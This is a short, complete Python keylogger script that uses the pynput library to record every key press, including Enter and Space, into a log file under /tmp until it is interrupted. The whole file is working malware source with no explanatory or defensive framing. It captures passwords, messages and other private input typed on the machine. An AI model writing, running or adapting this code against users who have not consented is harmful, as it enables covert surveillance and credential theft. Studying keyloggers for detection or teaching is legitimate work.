#!/usr/bin/python
import os
from pynput import keyboard

class Keylogger:
    def __init__(self):
        self.keylogs = '/tmp/keylogs.logs'
        self.keylogsfile = open(self.keylogs, 'a+')

    def callback(self, key):
        try:
            self.keylogsfile.write(key.char)
        except AttributeError:
            special_key = str(key)
            if special_key == 'Key.enter':
                special_key = '\n'
            if special_key == 'Key.space':
                special_key = ' '
            self.keylogsfile.write(special_key)

    def run(self):
        with keyboard.Listener(on_press=self.callback) as listener:
            listener.join()

    def stop(self):
        self.keylogsfile.close()

if __name__=='__main__':
    keylogger = Keylogger()
    try:
        keylogger.run()
    except KeyboardInterrupt:
        keylogger.stop()
